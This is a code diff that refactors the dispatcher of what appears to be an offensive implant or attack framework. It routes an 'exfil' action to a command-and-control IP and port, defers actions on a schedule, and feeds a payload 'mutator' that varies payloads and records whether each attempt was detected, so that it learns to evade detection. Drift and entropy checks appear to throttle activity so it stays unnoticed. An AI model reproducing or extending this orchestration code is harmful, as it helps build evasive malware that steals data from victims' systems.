@@ -188,71 +188,31 @@ class Dispatcher:
                 if delay > 0:
                     print(f"[scheduler] deferred — executing at {schedule} (in {int(delay)}s)")
                     import threading
-                    def deferred():
-                        time.sleep(delay)
-                        print(f"[scheduler] firing deferred action: {action}")
-                        self._execute(action_obj)
-                    t = threading.Thread(target=deferred, daemon=True)
+                    t = threading.Thread(
+                        target=lambda: (time.sleep(delay), self._run(action_obj)),
+                        daemon=True,
+                    )
                     t.start()
                     return {"scheduled": True, "run_at": schedule, "delay_seconds": int(delay)}
             except Exception as e:
                 print(f"[scheduler] could not parse schedule '{schedule}': {e} — executing now")
 
-        drift_result  = self.drift.ingest(action_obj)
-        drift_score   = self.drift.drift_score
-        drift_status  = 'HALT' if drift_result['halt'] else 'WARN' if drift_result['warn'] else 'NOMINAL'
-
-        if drift_status == "HALT":
-            print(f"[HALT] Drift blocked — drift={drift_score:.3f}")
-            return {"halted": True, "reason": "drift", "drift_score": drift_score}
-        if drift_status == "WARN":
-            print(f"[WARN] Drift elevated — drift={drift_score:.3f}")
-
-        entropy_result = self.entropy.ingest(action_obj, action_obj.get("_raw_cmd", ""))
-        entropy_score  = self.entropy.current_entropy()
-        entropy_status = self.entropy.report()['status']
-
-        if entropy_status == "CRITICAL":
-            print(f"[HALT] Entropy blocked — entropy={entropy_score:.3f}")
-            return {"halted": True, "reason": "entropy", "entropy_score": entropy_score}
-
-        mutation = self.mutator.mutate(action_obj=action_obj, entropy_score=entropy_score, drift_score=drift_score)
-        print(f"[mutator] personality={mutation.personality.value} ops={[op.value for op in mutation.mutation_ops]} fitness={mutation.fitness_score:.2f} hash={mutation.payload_hash}")
-
-        handler = _HANDLERS.get(action)
-        if not handler:
-            print(f"[!] No handler for action: {action}")
-            return {"halted": False, "error": f"unknown action: {action}"}
-
-        t0 = time.time()
-        if action == "exfil":
-            result = handler(action_obj, mutation, self.c2_ip, self.c2_port)
-        else:
-            result = handler(action_obj, mutation)
-        result["latency_ms"] = round((time.time() - t0) * 1000, 1)
-
-        self.mutator.feedback(ChannelFeedback(
-            payload_hash = mutation.payload_hash,
-            success      = result.get("success", False),
-            detected     = result.get("detected", False),
-            channel      = result.get("channel", "unknown"),
-            latency_ms   = result.get("latency_ms", 0.0),
-            error        = result.get("error"),
-        ))
-
-        status = "[+]" if result.get("success") else "[!]"
-        print(f"{status} {action} via {result.get('channel')} latency={result.get('latency_ms')}ms")
-        if result.get("error"):
-            print(f"    error: {result['error']}")
-        return result
+        return self._run(action_obj)
 
     def _execute(self, action_obj):
         """Internal — runs the action immediately, bypassing schedule gate."""
+        return self._run(action_obj)
+
+    def _run(self, action_obj):
+        """
+        Core execution path. Runs drift check → entropy check → mutation → handler.
+        Called by both dispatch() (after schedule gate) and _execute() (immediate).
+        """
         action = action_obj.get("action", "unknown")
 
-        drift_result  = self.drift.ingest(action_obj)
-        drift_score   = self.drift.drift_score
-        drift_status  = "HALT" if drift_result["halt"] else "WARN" if drift_result["warn"] else "NOMINAL"
+        drift_result = self.drift.ingest(action_obj)
+        drift_score  = self.drift.drift_score
+        drift_status = "HALT" if drift_result["halt"] else "WARN" if drift_result["warn"] else "NOMINAL"
 
         if drift_status == "HALT":
             print(f"[HALT] Drift blocked — drift={drift_score:.3f}")
@@ -268,8 +228,17 @@ class Dispatcher:
             print(f"[HALT] Entropy blocked — entropy={entropy_score:.3f}")
             return {"halted": True, "reason": "entropy", "entropy_score": entropy_score}
 
-        mutation = self.mutator.mutate(action_obj=action_obj, entropy_score=entropy_score, drift_score=drift_score)
-        print(f"[mutator] personality={mutation.personality.value} ops={[op.value for op in mutation.mutation_ops]} fitness={mutation.fitness_score:.2f} hash={mutation.payload_hash}")
+        mutation = self.mutator.mutate(
+            action_obj    = action_obj,
+            entropy_score = entropy_score,
+            drift_score   = drift_score,
+        )
+        print(
+            f"[mutator] personality={mutation.personality.value} "
+            f"ops={[op.value for op in mutation.mutation_ops]} "
+            f"fitness={mutation.fitness_score:.2f} "
+            f"hash={mutation.payload_hash}"
+        )
 
         handler = _HANDLERS.get(action)
         if not handler:
@@ -277,10 +246,11 @@ class Dispatcher:
             return {"halted": False, "error": f"unknown action: {action}"}
 
         t0 = time.time()
-        if action == "exfil":
-            result = handler(action_obj, mutation, self.c2_ip, self.c2_port)
-        else:
-            result = handler(action_obj, mutation)
+        result = (
+            handler(action_obj, mutation, self.c2_ip, self.c2_port)
+            if action == "exfil"
+            else handler(action_obj, mutation)
+        )
         result["latency_ms"] = round((time.time() - t0) * 1000, 1)
 
         self.mutator.feedback(ChannelFeedback(
@@ -297,6 +267,7 @@ class Dispatcher:
         if result.get("error"):
             print(f"    error: {result['error']}")
         return result
+
 
     def fitness_report(self):
         print("\n── Fitness report ──")
